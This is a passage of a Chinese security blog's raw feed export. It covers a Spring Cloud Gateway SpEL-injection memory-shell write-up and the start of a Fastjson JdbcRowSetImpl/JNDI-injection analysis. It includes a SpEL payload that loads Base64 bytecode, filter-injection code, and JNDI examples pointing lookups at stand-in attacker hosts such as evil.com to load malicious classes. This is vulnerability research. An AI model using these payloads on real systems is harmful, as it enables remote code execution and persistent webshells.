class="title class_">ArrayList</span>&lt;&gt;(defaultWebFilterChain.getFilters());</span><br><span class="line">newAllFilters.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">FilterMemshellPro</span>());</span><br><span class="line"><span class="type">DefaultWebFilterChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebFilterChain</span>((WebHandler) handler, newAllFilters);</span><br></pre></td></tr></table></figure><p>生成filteringWebHandler:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> filteringWebHandler.getClass().getDeclaredField(<span class="string">&quot;chain&quot;</span>);</span><br><span class="line">....</span><br><span class="line">f.set(filteringWebHandler,newChain);</span><br></pre></td></tr></table></figure><p>直达github完整poc：<a href="https://github.com/mieeA/SpringWebflux-MemShell/">https://github.com/mieeA/SpringWebflux-MemShell/</a></p><h4 id="spel表达式注入字节码"><a href="#spel表达式注入字节码" class="headerlink" title="spel表达式注入字节码"></a>spel表达式注入字节码</h4><p>Memshell改为你的软件包名+shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="string">&#x27;Memshell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="string">&#x27;yv66vgAAA....&#x27;</span>),<span class="keyword">new</span> <span class="title class_">javax</span>.management.loading.MLet(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[<span class="number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中<code>&#39;yv66vgAAA....&#39;</code>为Base64Encode的字节码，可通过如下代码生成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.Base64Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodeShell</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;MemShell.class&quot;</span>);</span><br><span class="line">            data = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">            in.read(data);</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">shellStr</span> <span class="operator">=</span> Base64Utils.encodeToString(data);</span><br><span class="line">        System.out.println(shellStr);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ShellStr.txt&quot;</span>);</span><br><span class="line">            out.write(shellStr.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403160101623.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403160101623.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230403160101623"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403210809225.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403210809225.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230403210809225"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211324940.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211324940.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230403211324940"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211438387.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211438387.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230403211438387"></p><p>如果注入过程有问题，可以在docker中看下Log</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/spring-cloud/spring-cloud-gateway/commit/d8c255eddf4eb5f80ba027329227b0d9e2cd9698">https://github.com/spring-cloud/spring-cloud-gateway/commit/d8c255eddf4eb5f80ba027329227b0d9e2cd9698</a></p><p>commit的历史中，把StandardEvaluationContext替换为了SimpleEvalutionContext</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328182426298.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328182426298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328182426298"></p><p>参考：<a href="https://blog.csdn.net/ExpLang/article/details/121670490?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167927922816800192224617%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167927922816800192224617&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121670490-null-null.142%5Ev74%5Econtrol,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">spel表达式注入</a></p><p><a href="https://www.cnblogs.com/N0r4h/p/15986151.html">spel注入分析</a></p><p><a href="http://wjlshare.com/archives/1748">http://wjlshare.com/archives/1748</a></p><p><a href="https://xz.aliyun.com/t/11331">https://xz.aliyun.com/t/11331</a></p><p><a href="https://forum.butian.net/share/1410">https://forum.butian.net/share/1410</a></p><p><a href="https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg">https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> OtherCVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> SPEL表达式注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson jdbcRowSetImpl链及后续漏洞分析</title>
      <link href="/2023/02/06/fastjson-jdbcrowsetimpl-lian-ji-hou-xu-lou-dong-fen-xi/"/>
      <url>/2023/02/06/fastjson-jdbcrowsetimpl-lian-ji-hou-xu-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastjson-jdbcRowSetImpl链及后续漏洞分析"><a href="#Fastjson-jdbcRowSetImpl链及后续漏洞分析" class="headerlink" title="Fastjson jdbcRowSetImpl链及后续漏洞分析"></a>Fastjson jdbcRowSetImpl链及后续漏洞分析</h1><p>在jdbcRowSetImpl中会用到jndi和rmi的知识</p><p>具体请见：<a href="https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA">https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA</a></p><p>素十八大佬对RMI流程的源码进行了深入分析：<a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p><p>本文源码分析均可跳过</p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>​拥有远程方法的类必须实现Remote接口，且该类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，可以调用UnicastRemoteObject.exportObject()手工初始化，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">implements</span> <span class="title class_">IHello</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="built_in">this</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 继承了Remote类的IHello接口 是客户端和服务端共用的接口。因为客户端指定调用的远程方法，它的全限定名必须和服务器上的完全相同</p><ul><li>RMI通信过程：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210154646704.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210154646704.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221210154646704"></p><p>其中存根stub是客户端的代理，骨架skeleton是服务器代理</p><ol><li><p>创建远程对象。<code>ServiceImpl service = new ServiceImpl();</code></p></li><li><p>注册远程对象。<code>Naming.bind(&quot;rmi:127.0.0.1:1099/service&quot;,service);</code>(service为ServiceImpl定义的远程对象)</p></li><li><p>客户端访问服务器并查找远程对象。包括两个步骤：</p><p>①用interface定义要查找的远程对象，在第四步作为引用：<code>ServiceInterface service = (ServiceInterface);</code></p><p>②查找远程对象。<code>Naming.lookup(&quot;rmi://127.0.0.1:1099/service&quot;)</code></p></li><li><p>Registry返回服务器对象存根。也就是把远程对象service作为自己的service（引用），称为stub</p></li><li><p>调用远程方法。比如<code>String rep = service.cxk(&quot;ctrl&quot;);</code></p></li><li><p>客户端存根和服务器骨架通信</p></li><li><p>骨架代理调用<code>service.cxk(&quot;ctrl&quot;);</code>，实际上是在Server端调用的</p></li><li><p>骨架把结果返回给存根</p></li><li><p>存根把结果返回给客户端</p></li></ol><p>其中存根stub在客户端，skeleton是服务端本身的远程对象(service本尊)</p><p>注册远程对象一般是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHello</span> <span class="variable">rhello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://x.x.x.x:1099/hello&quot;</span>,rhello);</span><br></pre></td></tr></table></figure><p>然后客户端利用<code>LocateRegistry.getRegistry()</code>本地创建Stub作为Registry远程对象的代理。然后利用lookup根据名称查找某个远程对象，来获取该远程对象的Stub：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;kingx_kali_host&quot;</span>,<span class="number">1099</span>);</span><br><span class="line"><span class="type">IHello</span> <span class="variable">rhello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">rhello.sayHello(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h3><p>在本地找不到类时，会从远程URL去下载。比如服务端返回的对象是一些子类的对象实例，但是客户端上并没有其子类的class文件，如果客户端要用到这些子类中的方法，则需要允许其动态加载其他类的能力。</p><p>所以客户端使用了Registry的机制，RMIServer把url传递给客户端，客户端通过HTTP下载类。</p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI用来定位资源。JNDI每个对象都有唯一的名字与其对应，可以通过名字检索对象</p><p>JNDI接口初始化时，可以将RMI URL作为参数，JNDI注入漏洞出现在客户端的lookup()函数。</p><p>如下用JNDI进行lookup：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"><span class="comment">//RegistryContextFactory 是RMI Registry Service Provider对应的Factory</span></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://www.0kai0.cn:8080&quot;</span>);</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"><span class="type">Object</span> <span class="variable">local_obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;rmi://www.0kai0.cn:8080/test&quot;</span>);</span><br></pre></td></tr></table></figure><p>其中InitialContext类作为JNDI命名服务的入口点，该类实现了Context接口。InitialContext构造函数需要为Hashtable或者其子类。初始化时要指定上下文环境，通常是JNDI工厂和JNDI的url和端口。比如这里是RMI服务，就指定RMI的工厂和url</p><p>该种初始化方式利用了哈希表，其实也可以直接设置value值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">&quot;rmi://www.0kai0.cn:8080&quot;</span>);</span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure><ul><li><p>JNDI提供的服务：</p><p>Java Naming 命名服务。进行命名，也就是键值对的绑定</p><p>Java Directory 目录服务。目录服务的对象可以有属性，在目录服务中可以根据属性检索对象</p><p>ObjectFactory 对象工厂。将Naming Service（如RMI）中存储的数据转化为Java中可表达的数据。</p><p>JNDI注入就是远程下载自定义的ObjectFactory类</p></li></ul><p>在JNDI中提供了bind绑定和lookup检索对象。lookup通过名字进行检索</p><blockquote><p>RMI绑定的对象和JNDI绑定对象的区别</p><p>1.纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口。JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中</p><p>2.纯RMI实现中是调用java.rmi包内的lookup()方法来检索。JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索</p></blockquote><h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>Reference类表示对存在于Naming&#x2F;Directory之外的对象引用</p><p>对象可以通过Reference存储在Naming或者Directory服务下。有师傅可能会问，javax.naming.InitialContext.bind()不就是绑定对象了吗，但是RMI绑定的对象为本地远程对象（在本地项目文件内），Reference可以远程加载类(file&#x2F;ftp&#x2F;http等协议)，并且实例化</p><blockquote><p>java中的对象分本地对象和远程对象，本地对象默认可信任。远程对象根据安全管理器划分到不同的域，而拥有不同的权限</p><p>不过JNDI有两种安全控制方式，对JNDI SPI层，RMI\LDAP\CORBA的控制方式不同</p><table><thead><tr><th align="center"></th><th>远程加载类权限</th><th>安全管理器强制实施</th></tr></thead><tbody><tr><td align="center">RMI</td><td>java.rmi.server.userCodebaseOnly&#x3D;false(JDK&gt;7u21&#x3D;true)</td><td>Always</td></tr><tr><td align="center">LDAP</td><td>com.sun.jndi.ldap.object.trustURLCodebase&#x3D;true(默认flase)</td><td>非强制</td></tr><tr><td align="center">CORBA</td><td></td><td>always</td></tr></tbody></table></blockquote><h3 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h3><p>有的时候你指定了RMI服务，但是在使用的时候用到LDAP服务的绑定对象。可以直接指定协议，在lookup()、search()会访问LDAP服务的对象而非RMI（那设置工厂有什么意义？其实设置工厂是为了bind()对象到RMI服务，至于search、lookup这种工作不局限于RMI，所以就动态转换了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.lookup(<span class="string">&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;</span>);</span><br></pre></td></tr></table></figure><p>在lookup()的源码也可以看到，getURLOrDefaultInitCtx()尝试获取对应协议的上下文环境</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="利用JNDI-References进行注入（RMI）"><a href="#利用JNDI-References进行注入（RMI）" class="headerlink" title="利用JNDI References进行注入（RMI）"></a>利用JNDI References进行注入（RMI）</h3><p>RMI Server除了可以直接绑定远程对象外（先new后bind），还能通过<code>References</code>类来直接绑定外部远程对象。</p><p>当绑定在RMI注册表中的Reference，指向恶意远程class文件。并且JNDI客户端lookup()参数可控（或者Reference指定远程类参数可控），能实现RCE</p><blockquote><p>攻击原理：</p><ol><li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li><li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li><li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code>想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li><li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li><li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li></ol></blockquote><ul><li>示例：</li></ul><p>JNDIClient：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ctx.lookup(rmi:<span class="comment">//127.0.0.1:1099/refObj);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServer：</p><p>RMI绑定的远程对象需要继承UnicastRemoteObject类并实现Remote接口，ReferenceWrapper类就符合条件。用ReferenceWrapper对Reference进行封装。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//Registry写在server里</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中Reference构造函数的第一个参数是在本地查找EvilObject类，如果没有，就从<code>http://127.0.0.1:8080/</code>搜索第二个参数名的EvilObject类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="服务端Reference-classFactoryLocation可控"><a href="#服务端Reference-classFactoryLocation可控" class="headerlink" title="服务端Reference classFactoryLocation可控"></a>服务端Reference classFactoryLocation可控</h4><p>在Reference构造函数中的第三个参数，远程加载类的URL地址，称为classFactoryLocation。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br></pre></td></tr></table></figure><p>因为在服务端，所以这种情况很少见。</p><p>如下Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilClass&quot;</span>, <span class="string">&quot;EvilClassFactory&quot;</span>, uri);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">        registry.bind(<span class="string">&quot;demo&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到uri可控，当指向攻击者自己的web服务器，攻击者将EvilClassFactory恶意类放到自己的web服务器下 uri路径。RMI客户端通过JNDI查询绑定的类时，会远程加载恶意类造成命令执行</p><h4 id="客户端lookup参数可控"><a href="#客户端lookup参数可控" class="headerlink" title="客户端lookup参数可控"></a>客户端lookup参数可控</h4><p>如JNDI客户端lookup()接收外部可控参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:1099&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击者可以传入恶意URI地址指向攻击者的RMIRegistry，构造恶意RMIServer，自然也能构造RMI注册表的恶意类。比如攻击者搭建的恶意AServer（图方便注册表和server一起写）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1688</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilClass&quot;</span>, <span class="string">&quot;EvilClassFactory&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Binding &#x27;exp&#x27; to &#x27;rmi://127.0.0.1:1688/exp&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;exp&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在服务端写恶意EvilClass，或者URL目录下(test&#x2F;)写恶意EvilClassFactory都能造成远程代码执行。</p><p>此时向lookup传指向恶意Server的参数：rmi:&#x2F;&#x2F;127.0.0.1:1688&#x2F;exp</p><p><strong>小细节</strong>：当使用lookup指定rmi服务来搜寻类时，搜寻到的类需要满足远程类的要求：继承UnicastRemoteObject并实现Remote接口</p><p>造成该漏洞需要 能实现动态转换uri的InitialContext.lookup()</p><p>RMI调用了该函数的类有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 